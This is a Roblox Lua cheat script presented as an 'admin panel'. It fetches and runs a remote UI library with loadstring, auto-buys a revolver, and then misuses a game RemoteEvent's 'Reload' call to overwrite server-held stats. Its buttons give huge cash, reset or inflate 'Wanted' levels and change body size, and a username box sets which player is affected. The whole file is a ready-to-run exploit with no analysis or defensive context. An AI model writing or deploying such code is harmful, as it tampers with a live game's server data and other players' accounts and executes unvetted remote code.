local colors = {
    SchemeColor = Color3.fromRGB(0,255,255),
    Background = Color3.fromRGB(0, 0, 0),
    Header = Color3.fromRGB(0, 0, 0),
    TextColor = Color3.fromRGB(255,255,255),
    ElementColor = Color3.fromRGB(20, 20, 20)
}

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("OrionBlue Admin Pannel", colors)
local Tab = Window:NewTab("ORIONBLUEE")
local Section = Tab:NewSection("BlackFire Lol")






local Workspace = game:GetService("Workspace")
local Players = game.Players.LocalPlayer

local Character = Players.Character




function Buy(Object)
    local Object = Object
    local LockPicker = Workspace.Ignored.Shop[Object]
    Character.HumanoidRootPart.CFrame = LockPicker.Head.CFrame + Vector3.new(0, 3, 0)
    wait(0.5)
    fireclickdetector(LockPicker.ClickDetector)
    fireclickdetector(LockPicker.ClickDetector)
end

Buy("[Revolver] - $1300")

wait(0.5)


wait(0.5)

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]", --// reminder: [Double-Barrel SG] or [Revolver] works for any gun but i put it here so i can just copy and paste whenever i want to
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = {Value = math.huge*9e9},
        MaxAmmo = {Value = 0},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
)

wait(2)



_G.Aiden = Players --CHANGE NAME HERE

_G.Amount = 999999999999 --999999999999

_G.Amount2 = 7777777777
---

_G.Reset = 1 

Section:NewButton("Give 999999999999 Cash", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
         Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
        MaxAmmo = {Value = _G.Amount},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)


Section:NewButton("Reset Wanted", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].leaderstats.Wanted, --game:GetService("Players").SEDFUIY75W34UIHJ.leaderstats.Wanted
        MaxAmmo = {Value = _G.Reset},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)


Section:NewButton("Give 99999999 wanted", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].leaderstats.Wanted,
        MaxAmmo = {Value = _G.Amount2},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)

Section:NewButton("Skinny (RESET AFTER)", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Information.MuscleInformation,
        MaxAmmo = {Value = -999999999999999999999999999999999999999999999999999999999999999999999999999},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)



Section:NewButton("HUGE (RESET AFTER)", "", function()

    game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
        "Reload",
        {
            Name = "[Revolver]",
            Parent = Game.Players.LocalPlayer.Backpack,
            ClassName = "Tool",
            Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Information.MuscleInformation,
            MaxAmmo = {Value = 999999},
            GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
            Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
        }
    ) 
    end)
    


    Section:NewButton("Fix Size (RESET AFTER)", "", function()

        game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
            "Reload",
            {
                Name = "[Revolver]",
                Parent = Game.Players.LocalPlayer.Backpack,
                ClassName = "Tool",
                Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Information.MuscleInformation,
                MaxAmmo = {Value = -0.5},
                GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
                Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
            }
        ) 
        end)
        

Section:NewButton("Reset Cash", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
        MaxAmmo = {Value = _G.Reset},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)




--game:GetService("Players").BadSnif






Section:NewTextBox("Username", "the guy who receive cash", function(value)
    _G.Aiden = value
end)
